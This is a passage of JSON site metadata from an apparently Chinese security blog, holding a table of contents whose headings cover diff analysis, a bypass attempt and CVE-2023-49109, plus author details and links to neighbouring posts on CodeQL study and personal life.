分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E6%BA%90%E7%A0%81-diff-%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x01 源码 diff 分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">0x02 尝试绕过</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2023-49109\"><span class=\"toc-text\">CVE-2023-49109</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E5%88%9D%E6%AD%A5%E5%AE%9A%E4%BD%8D\"><span class=\"toc-text\">0x01 初步定位</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x02 漏洞逻辑分析</span></a></li></ol></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/06/28/667ece6738c20.jpg","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"CodeQL学习","uid":"21952381f57493672835351001f3cf9b","slug":"CodeQL学习","date":"2024-05-02T08:00:00.000Z","updated":"2024-06-28T15:08:52.369Z","comments":true,"path":"api/articles/CodeQL学习.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","text":"本文为个人学习笔记+一些个人的理解调试，仅供学习参考 首先存几个学习地点https://drun1baby.top/2023/09/03/CodeQL-%E5%...","permalink":"/post/CodeQL学习","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"16 mins."},"categories":[{"name":"挥刀练习之codeQL","slug":"挥刀练习之codeQL","count":1,"path":"api/categories/挥刀练习之codeQL.json"}],"tags":[{"name":"用刀的技艺","slug":"用刀的技艺","count":1,"path":"api/tags/用刀的技艺.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/06/28/667ece6738c20.jpg","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Re_Life","uid":"e27ee1420eabe8cdee8a787b1e2c29ea","slug":"Re_Live","date":"2024-03-31T15:59:00.000Z","updated":"2024-06-28T15:03:40.502Z","comments":true,"path":"api/articles/Re_Live.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf0120de9.webp","text":"最近也是很累啊，实习考核迫近，渗透和实战这块由于前期经验和学习时间分配的过少，导致现在就是天天挤时间恶补，但是一到关于内网这种基础知识我真的是半点看不懂啊（我就...","permalink":"/post/Re_Live","photos":[],"count_time":{"symbolsCount":727,"symbolsTime":"1 mins."},"categories":[{"name":"Life","slug":"Life","count":2,"path":"api/categories/Life.json"}],"tags":[{"name":"Felling","slug":"Felling","count":2,"path":"api/tags/Felling.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/06/28/667ece6738c20.jpg","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}